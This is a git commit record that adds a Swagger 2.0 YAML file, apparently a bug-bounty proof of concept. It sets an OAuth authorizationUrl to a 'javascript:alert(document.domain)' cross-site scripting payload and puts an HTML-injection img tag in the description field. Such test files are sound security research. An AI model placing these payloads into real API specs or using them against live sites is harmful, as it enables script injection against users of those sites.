d65b97659f504ea84e9c0ea77fe866c4424b2df9
MehmetBugcrowd <102980873+MehmetBugcrowd@users.noreply.github.com>
2022-06-18 02:22:48 +0200

    Add files via upload

---
+++ htm.yaml.php
@@ -0,0 +1,15 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(document.domain)//
+info:
+  version: "0.0.1"
+  title: Example Title
+  description: html inject <img src=https://geekflare.com/wp-content/uploads/2020/02/Code-injection-e1580817731194.jpg>
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful respons
